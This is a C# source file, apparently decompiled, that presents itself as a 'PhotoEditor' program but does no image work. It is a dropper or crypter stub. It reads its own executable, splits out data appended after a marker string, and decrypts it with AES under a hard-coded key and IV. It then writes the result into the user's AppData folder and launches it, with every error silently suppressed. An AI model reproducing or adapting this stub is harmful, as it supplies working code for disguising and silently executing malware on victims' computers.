using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace PhotoEditor;

internal class PhotoEditor
{
	private static string[] splitT = new string[1] { "[Erb056N4K2sSgEfXQoUf92mwbFd5HWB]" };

	private static string tempMap;

	private static string tempData;

	private static string[] tempArray;

	private static byte[] tempFileContent;

	private static string Disk()
	{
		try
		{
			File.WriteAllBytes(tempMap + "\\" + tempArray[2], tempFileContent);
			return "";
		}
		catch
		{
			return "";
		}
	}

	private static void Main(string[] args)
	{
		try
		{
			tempData = readAT();
			tempMap = getAppData();
			tempArray = returnSplitContent();
			tempFileContent = ByteReturner(Convert.FromBase64String(tempArray[1]));
			Disk();
			returnFile();
		}
		catch
		{
		}
	}

	private static byte[] ByteReturner(byte[] fileData)
	{
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] iV = new byte[16]
			{
				1, 2, 3, 4, 5, 6, 7, 8, 9, 1,
				2, 3, 4, 5, 6, 7
			};
			byte[] key = new byte[16]
			{
				7, 6, 5, 4, 3, 2, 1, 9, 8, 7,
				6, 5, 4, 3, 2, 1
			};
			rijndaelManaged.IV = iV;
			rijndaelManaged.Key = key;
			return rijndaelManaged.CreateDecryptor().TransformFinalBlock(fileData, 0, fileData.Length);
		}
		catch
		{
			return null;
		}
	}

	private static string returnFile()
	{
		try
		{
			Process.Start(tempMap + "\\" + tempArray[2]);
			return "";
		}
		catch
		{
			return "";
		}
	}

	private static string readAT()
	{
		try
		{
			return File.ReadAllText(Process.GetCurrentProcess().MainModule!.FileName);
		}
		catch
		{
			return "";
		}
	}

	private static string getAppData()
	{
		try
		{
			return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		}
		catch
		{
			return "";
		}
	}

	private static string[] returnSplitContent()
	{
		try
		{
			return tempData.Split(splitT, StringSplitOptions.None);
		}
		catch
		{
			return new string[0];
		}
	}
}
